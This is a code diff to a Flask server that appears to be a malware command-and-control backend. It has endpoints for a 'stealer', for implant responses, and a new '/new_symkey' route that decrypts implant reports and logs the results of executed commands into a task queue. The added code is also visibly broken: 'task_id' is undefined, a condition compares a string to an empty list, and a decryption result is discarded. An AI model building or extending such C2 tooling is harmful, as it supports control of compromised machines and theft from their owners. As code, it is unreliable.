@@ -267,6 +267,45 @@ def handle_response_stealer():
         print(error)
         return error, 402, {'Access-Control-Allow-Origin': config.clientURL}
 
+
+@app.route("/new_symkey", methods=["POST"])
+def getsymkey():
+    try:
+        data = request.get_json(force=True)
+        print()
+        print("response:")
+        data= data['data']
+        
+        RsaDecryption.decrypt(data)
+        response_data = data['response_data']
+        success = data['success']
+        command = data['command']
+        print("checking command: " + command)
+        print("Querying now")
+        # DUMP BACK INTO TASK_QUEUE
+
+        if success in ["success", "Success"]:
+            success = True  
+        else: 
+            success = False
+
+        query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
+        if query ==[]:
+            print("\n\nupdate task queue worked\n\n")
+        time = datetime.now()
+        print(response_data, success, time, task_id)
+        response = tools.executeGenericVar(query, [response_data, success, time, task_id])
+        print(response)
+        return "success", 200, {'Access-Control-Allow-Origin': config.clientURL}
+
+    except Exception as error:
+        print()
+        print()
+        print(error)
+        print()
+        return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
+
+
 #Implant response endpoint, in json
 @app.route("/response_data", methods=["POST"])
 @cross_origin()
@@ -274,8 +313,12 @@ def handle_response_data():
     print("Received response")
     if(request.content_length<5000000):
         try:    
-            data = request.get_data()
+            x=request.get_data()
+            data=request.data
+            print(request.data)
+            print(x)
             data=RsaDecryption.rsadecrypt(data)
+            print(data)
             print("response:")
             print(data)
             print(str(data))
@@ -379,7 +422,7 @@ def handle_response():
         # # DUMP BACK INTO TASK_QUEUE
         # query = "UPDATE task_queue SET (status='executed' response_data=%s success=%s recieved_on=%s) WHERE task_id=%s"
 
-        print("succesful")
+        print("successful")
         time = datetime.now()
         # tools.executeGenericVar(query, [response_data, success, time, task_id])
 
